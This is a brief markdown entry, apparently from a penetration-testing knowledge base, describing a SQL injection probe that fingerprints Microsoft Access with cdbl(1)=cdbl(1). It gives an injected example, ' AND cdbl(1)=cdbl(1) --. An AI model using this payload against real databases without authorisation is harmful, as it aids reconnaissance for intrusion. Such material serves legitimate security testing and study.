---
type: command
executor: sql
data: cdbl(1)=cdbl(1)
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Database
tags:
  - sql-injection
  - fingerprinting
verified: true
validated: true
---

# access-cdbl-test

## Command

```sql
cdbl(1)=cdbl(1)
```

## Description

Tests Microsoft Access using cdbl() for double conversion.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| None | Fixed | N/A |

## Examples

### Basic Usage

`' AND cdbl(1)=cdbl(1) --`

## Expected Output

True if Access.

## Related

- [[procedures/DBMS-Fingerprinting-via-SQL-Injection]]
